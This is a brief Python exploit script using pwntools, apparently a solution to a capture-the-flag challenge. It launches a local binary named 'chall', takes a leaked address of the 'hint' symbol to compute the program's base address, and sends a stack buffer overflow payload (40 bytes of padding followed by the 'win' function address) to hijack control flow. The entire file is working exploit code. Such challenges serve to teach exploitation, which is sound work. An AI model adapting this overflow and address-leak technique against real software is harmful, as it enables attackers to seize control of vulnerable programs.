import pwn
import sys

elf = pwn.ELF('./chall')
io = elf.process()
print(io.recv(100000).decode("utf-8"))

#Get the hint
hint = input()
hint = int(hint, 16)

#Take hint and subtract the symbol
#Set base address
elf.address = hint - elf.sym['hint']

new_eip = pwn.p64(elf.sym['win'])
#create payload with win address and offset
payload = b"".join(
    [
        b"A" * 40,
        new_eip,
    ]
)
io.sendline(payload)
print(io.recvrepeat(1).decode("utf-8"))